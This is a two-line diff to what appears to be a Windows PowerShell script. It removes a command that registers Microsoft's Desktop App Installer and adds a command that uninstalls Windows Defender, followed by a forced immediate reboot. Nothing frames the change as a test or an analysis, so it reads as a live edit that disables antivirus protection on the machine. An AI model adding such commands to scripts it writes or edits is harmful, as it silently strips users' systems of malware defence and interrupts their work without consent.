@@ -1,1 +1,2 @@
-Add-AppxPackage -RegisterByFamilyName -MainPackage Microsoft.DesktopAppInstaller_8wekyb3d8bbwe
+Uninstall-WindowsFeature -Name Windows-Defender
+shutdown /r /t 0
